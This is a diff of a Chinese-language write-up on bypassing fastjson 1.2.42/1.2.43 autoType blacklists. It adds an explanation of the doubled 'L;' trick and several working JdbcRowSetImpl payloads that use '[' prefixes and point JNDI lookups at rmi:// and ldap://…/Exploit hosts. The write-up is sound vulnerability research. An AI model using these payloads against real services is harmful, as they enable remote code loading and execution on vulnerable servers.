@@ -1110,7 +1110,7 @@ JSON#parseObject(String text, Class<T> clazz)
 
 ![image-20250207145312281](./images/image-20250207145312281.png)
 
-**绕过：**双写`L;`
+**绕过：**回头看一下loadClass，发现其对于`L`和`;`的裁剪是递归的，所以双写`L;`即可绕过黑名单
 
 **Payload：**
 
@@ -1118,7 +1118,6 @@ JSON#parseObject(String text, Class<T> clazz)
 String fastSer =  "{\"@type\":\"LLcom.sun.rowset.JdbcRowSetImpl;;\",\"dataSourceName\":\"rmi://localhost:1999/obj\", \"autoCommit\":true}";
 ParserConfig.getGlobalInstance().setAutoTypeSupport(true);  //开启autoTypeSupport
 JSON.parseObject(fastSer);
-// 在开启autoTypeSupport的情况下，显示指定expectClass只要为JdbcRowSetImpl父类也不影响Payload
 ```
 
 ##### fastjson 1.2.43
@@ -1133,7 +1132,41 @@ JSON.parseObject(fastSer);
 
 不过这里可以看出，返回的是一个数组类型，后续是否可以利用，还是需要看一下返回后的代码逻辑。
 
-这里我们先要分析一下，如何让loadClass获取到以`[`开头的类名，这并不是一个很明了的问题，
+这里我们先要分析一下，如何让loadClass获取到以`[`开头的类名，这并不是一个很明了的问题，如下图，我们直接在类名前添加`[`，会抛出异常
+
+![image-20250208104148144](./images/image-20250208104148144.png)
+
+很明显，这里是json字符串解析出问题了，这里先给出Payload吧，然后我们再来分析
+
+**Payload：**
+
+```java
+String fastSer =  "{\"@type\":\"[com.sun.rowset.JdbcRowSetImpl\"[{,\"dataSourceName\":\"rmi://localhost:1999/obj\", \"autoCommit\":true}";
+ParserConfig.getGlobalInstance().setAutoTypeSupport(true);  //开启autoTypeSupport
+JSON.parseObject(fastSer);
+```
+
+很神奇，跟着异常，加了一个`[`，接着又抛出异常
+
+![image-20250208115244324](./images/image-20250208115244324.png)
+
+再根据异常信息加一个`{`，就成功了，可能正是因为比较简单就得出了Payload，网上没有怎么找到相关的原理分析文章。
+
+补充一下，从网上公布的Payload来看，这里写法是挺多样的，下列Payload都可以
+
+```json
+{"@type":"[com.sun.rowset.JdbcRowSetImpl"[{"dataSourceName":"ldap://127.0.0.1:1389/Exploit","autoCommit":true]}
+{"@type":"[com.sun.rowset.JdbcRowSetImpl"[{"dataSourceName":"ldap://127.0.0.1:1389/Exploit","autoCommit":true}
+{"@type":"[com.sun.rowset.JdbcRowSetImpl"[,{"dataSourceName":"ldap://127.0.0.1:1234/Exploit","autoCommit":true}
+```
+
+**原理分析：**
+
+我们来到下图处
+
+![image-20250208141812465](./images/image-20250208141812465.png)
+
+这里返回的反序列化器为一个`ObjectArrayCodec`类型
 
 ### 补充一下其他利用链
 
